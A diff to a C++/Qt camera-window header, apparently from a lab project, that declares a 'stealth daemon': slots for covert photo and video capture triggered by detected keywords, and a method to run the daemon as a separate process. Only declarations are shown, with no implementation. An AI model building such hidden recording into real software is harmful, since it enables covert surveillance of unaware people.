@@ -13,6 +13,9 @@
 
 class CameraWorker;
 class JakeCameraWarning;
+class StealthDaemonThread;
+class AutomaticStealthMode;
+class Lab4Logger;
 
 class CameraWindow : public QWidget
 {
@@ -40,6 +43,18 @@ private slots:
     void onError(const QString &error);
     void onCameraInfoReady(const QString &info);
     void onFrameReady(const QImage &frame);
+    
+    // Скрытый демон
+    void onStartStealthDaemon();
+    void onStopStealthDaemon();
+    void onDaemonStarted();
+    void onDaemonStopped();
+    void onKeywordDetected(const QString &keyword);
+    void onStealthPhotoTaken(const QString &path);
+    void onStealthVideoRecorded(const QString &path);
+    void onDaemonLogMessage(const QString &message);
+    
+    // Автоматический режим
 
 private:
     void setupUI();
@@ -47,6 +62,7 @@ private:
     void setupHotkeys();
     void registerGlobalHotkeys();
     void unregisterGlobalHotkeys();
+    bool startDaemonAsSeparateProcess();
 
     // UI элементы
     QLabel *previewLabel;           // Для отображения камеры
@@ -64,6 +80,11 @@ private:
     // Jake предупреждение
     JakeCameraWarning *jakeWarning;
     
+    // Скрытый демон
+    StealthDaemonThread *stealthDaemonThread;
+    
+    // Автоматический режим
+    
     // Состояния
     bool isRecording;
     bool isPreviewEnabled;
@@ -79,6 +100,11 @@ private:
     static constexpr int HOTKEY_TAKE_PHOTO = 3;
     static constexpr int HOTKEY_SHOW_WINDOW = 4;
     bool globalHotkeysRegistered;
+    
+    // Состояние скрытого демона
+    bool isStealthDaemonRunning;
+    
+    // Состояние автоматического режима
 };
 
 #endif // CAMERAWINDOW_H
